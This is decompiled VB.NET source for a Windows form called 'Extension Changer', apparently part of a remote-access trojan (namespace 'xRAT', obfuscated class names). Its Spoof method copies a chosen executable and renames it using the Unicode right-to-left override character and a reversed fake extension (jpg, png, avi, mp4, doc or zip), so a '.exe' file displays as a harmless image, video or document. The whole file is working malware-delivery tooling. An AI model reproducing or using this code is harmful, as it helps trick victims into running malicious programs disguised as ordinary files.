Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class Form2
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.Form2_Load)
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.Spoof(Me.TextBox1.Text, Me.ComboBox1.Text)
                Me.ProgressBar1.Value = Conversions.ToInteger("100")
                MessageBox.Show("Extension has changed !", "Extension Changer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub ComboBox1_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.ComboBox1.Text = "avi") Then
                Me.PictureBox1.Show
                Me.PictureBox2.Hide
                Me.PictureBox3.Hide
            End If
            If (Me.ComboBox1.Text = "mp4") Then
                Me.PictureBox1.Show
                Me.PictureBox2.Hide
                Me.PictureBox3.Hide
            End If
            If (Me.ComboBox1.Text = "zip") Then
                Me.PictureBox1.Hide
                Me.PictureBox2.Show
                Me.PictureBox3.Hide
            End If
            If (Me.ComboBox1.Text = "doc") Then
                Me.PictureBox1.Hide
                Me.PictureBox2.Show
                Me.PictureBox3.Hide
            End If
            If (Me.ComboBox1.Text = "png") Then
                Me.PictureBox1.Hide
                Me.PictureBox2.Hide
                Me.PictureBox3.Show
            End If
            If (Me.ComboBox1.Text = "jpg") Then
                Me.PictureBox1.Hide
                Me.PictureBox2.Hide
                Me.PictureBox3.Show
            End If
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub Form2_Load(ByVal sender As Object, ByVal e As EventArgs)
            Me.Timer1.Start
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.icontainer_0 = New Container
            Dim manager As New ComponentResourceManager(GetType(Form2))
            Me.TextBox1 = New TextBox
            Me.ComboBox1 = New ComboBox
            Me.Button1 = New Button
            Me.ProgressBar1 = New ProgressBar
            Me.Timer1 = New Timer(Me.icontainer_0)
            Me.PictureBox3 = New PictureBox
            Me.PictureBox2 = New PictureBox
            Me.PictureBox1 = New PictureBox
            DirectCast(Me.PictureBox3, ISupportInitialize).BeginInit
            DirectCast(Me.PictureBox2, ISupportInitialize).BeginInit
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            Me.SuspendLayout
            Dim point As New Point(12, 7)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            Dim size As New Size(&H145, &H15)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 0
            Me.TextBox1.Text = "C:\file.exe"
            Me.ComboBox1.FormattingEnabled = True
            Me.ComboBox1.Items.AddRange(New Object() { "jpg", "png", "avi", "mp4", "doc", "zip" })
            point = New Point(&HEA, &H25)
            Me.ComboBox1.Location = point
            Me.ComboBox1.Name = "ComboBox1"
            size = New Size(&H68, &H15)
            Me.ComboBox1.Size = size
            Me.ComboBox1.TabIndex = 2
            Me.ComboBox1.Text = "jpg"
            point = New Point(13, &H41)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(&H145, &H2C)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 3
            Me.Button1.Text = ":: Changer Extension ::"
            Me.Button1.UseVisualStyleBackColor = True
            point = New Point(13, &H24)
            Me.ProgressBar1.Location = point
            Me.ProgressBar1.Name = "ProgressBar1"
            size = New Size(&HB9, &H17)
            Me.ProgressBar1.Size = size
            Me.ProgressBar1.TabIndex = 1
            Me.PictureBox3.BackColor = Color.Transparent
            Me.PictureBox3.Image = Class5.smethod_69
            point = New Point(&HCC, &H21)
            Me.PictureBox3.Location = point
            Me.PictureBox3.Name = "PictureBox3"
            size = New Size(&H18, &H1B)
            Me.PictureBox3.Size = size
            Me.PictureBox3.TabIndex = 6
            Me.PictureBox3.TabStop = False
            Me.PictureBox2.BackColor = Color.Transparent
            Me.PictureBox2.Image = DirectCast(manager.GetObject("PictureBox2.Image"), Image)
            point = New Point(&HCC, &H24)
            Me.PictureBox2.Location = point
            Me.PictureBox2.Name = "PictureBox2"
            size = New Size(&H18, &H19)
            Me.PictureBox2.Size = size
            Me.PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox2.TabIndex = 5
            Me.PictureBox2.TabStop = False
            Me.PictureBox1.Image = Class5.smethod_94
            point = New Point(&HCC, &H23)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            size = New Size(&H18, &H18)
            Me.PictureBox1.Size = size
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage
            Me.PictureBox1.TabIndex = 4
            Me.PictureBox1.TabStop = False
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(350, &H79)
            Me.ClientSize = size
            Me.Controls.Add(Me.PictureBox3)
            Me.Controls.Add(Me.PictureBox2)
            Me.Controls.Add(Me.PictureBox1)
            Me.Controls.Add(Me.Button1)
            Me.Controls.Add(Me.ComboBox1)
            Me.Controls.Add(Me.ProgressBar1)
            Me.Controls.Add(Me.TextBox1)
            Me.FormBorderStyle = FormBorderStyle.FixedSingle
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.Name = "Form2"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "Extension Changer"
            DirectCast(Me.PictureBox3, ISupportInitialize).EndInit
            DirectCast(Me.PictureBox2, ISupportInitialize).EndInit
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Public Sub Spoof(ByVal file As String, ByVal extension As String)
            Dim bytes As Byte() = File.ReadAllBytes(file)
            File.WriteAllBytes((Application.StartupPath & ChrW(8238) & Strings.StrReverse(extension) & ".exe"), bytes)
        End Sub

        Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = value
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ComboBox1 As ComboBox
            Get
                Return Me._ComboBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ComboBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ComboBox1_SelectedIndexChanged)
                If (Not Me._ComboBox1 Is Nothing) Then
                    RemoveHandler Me._ComboBox1.SelectedIndexChanged, handler
                End If
                Me._ComboBox1 = value
                If (Not Me._ComboBox1 Is Nothing) Then
                    AddHandler Me._ComboBox1.SelectedIndexChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox1 = value
            End Set
        End Property

        Friend Overridable Property PictureBox2 As PictureBox
            Get
                Return Me._PictureBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox2 = value
            End Set
        End Property

        Friend Overridable Property PictureBox3 As PictureBox
            Get
                Return Me._PictureBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Me._PictureBox3 = value
            End Set
        End Property

        Friend Overridable Property ProgressBar1 As ProgressBar
            Get
                Return Me._ProgressBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ProgressBar)
                Me._ProgressBar1 = value
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox1 = value
            End Set
        End Property

        Friend Overridable Property Timer1 As Timer
            Get
                Return Me.timer_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
                If (Not Me.timer_0 Is Nothing) Then
                    RemoveHandler Me.timer_0.Tick, handler
                End If
                Me.timer_0 = value
                If (Not Me.timer_0 Is Nothing) Then
                    AddHandler Me.timer_0.Tick, handler
                End If
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("ComboBox1")> _
        Private _ComboBox1 As ComboBox
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("PictureBox2")> _
        Private _PictureBox2 As PictureBox
        <AccessedThroughProperty("PictureBox3")> _
        Private _PictureBox3 As PictureBox
        <AccessedThroughProperty("ProgressBar1")> _
        Private _ProgressBar1 As ProgressBar
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        Private icontainer_0 As IContainer
        <AccessedThroughProperty("Timer1")> _
        Private timer_0 As Timer
    End Class
End Namespace

